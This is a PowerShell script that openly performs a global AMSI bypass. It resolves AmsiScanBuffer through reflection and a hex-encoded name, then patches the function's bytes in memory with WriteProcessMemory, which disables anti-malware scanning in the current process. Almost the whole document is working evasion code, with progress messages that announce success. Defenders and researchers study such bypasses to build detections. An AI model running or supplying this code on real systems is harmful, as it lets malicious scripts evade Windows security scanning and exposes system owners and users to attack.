<#
    .SYNOPSIS
        Performs a global AMSI bypass by patching amsi.dll in memory.
    .DESCRIPTION
        This function modifies the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
    .LINK
     https://github.com/Chainski/GlobalAMSIBypass
#>
function get_proc_address {
    Param ($module, $function_name)
    Write-Host "[*] Looking up $function_name in $module"
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('Sys'+'tem.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@();$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    $address = $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($module)), $function_name))
    Write-Host "[+] Found $function_name at 0x$($address.ToString('X16'))" -ForeGroundColor Cyan
    return $address
}

function get_delegate_type {
    param([Type[]]$parameters,[Type]$returnType = [Void])
    Write-Host "[*] Creating delegate type for function pointer"
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[Reflection.CallingConventions]::Standard,$parameters).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',$returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
Write-Host "[*] Initializing global AMSI bypass via AmsiScanBuffer patch..."
Write-Host "[*] Locating AmsiScanBuffer in amsi.dll" -ForeGroundColor Cyan
$bypasser=(-join([regex]::Matches("416d73695363616e427566666572", '..')|%{[char]([convert]::ToUInt32($_.Value,16))}))
[IntPtr]$funcAddr = get_proc_address amsi.dll $bypasser
$funcAddrLong = [Long]$funcAddr + 33
$funcAddr2 = [IntPtr]$funcAddrLong
Write-Host "[+] Targeting patch address: 0x$($funcAddr2.ToString('X16'))"
$patchBytes = ([byte[]](72,49,219))
Write-Host "[*] Resolving WriteProcessMemory and GetCurrentProcess" -ForeGroundColor Cyan
$wpmType = get_delegate_type @([IntPtr],[IntPtr],[Byte[]],[UInt32],[UInt32].MakeByRefType()) ([Bool])
$wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory),$wpmType)
$gcpType = get_delegate_type @() ([IntPtr])
$gcp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll GetCurrentProcess),$gcpType)
$hProc = $gcp.Invoke()
$written = 0
Write-Host "[*] Applying patch via WriteProcessMemory"
$wpm.Invoke($hProc, $funcAddr2, $patchBytes, [UInt32]$patchBytes.Length, [ref]$written) | Out-Null
Write-Host "[!] Global AMSI bypass completed successfully!" -ForeGroundColor Green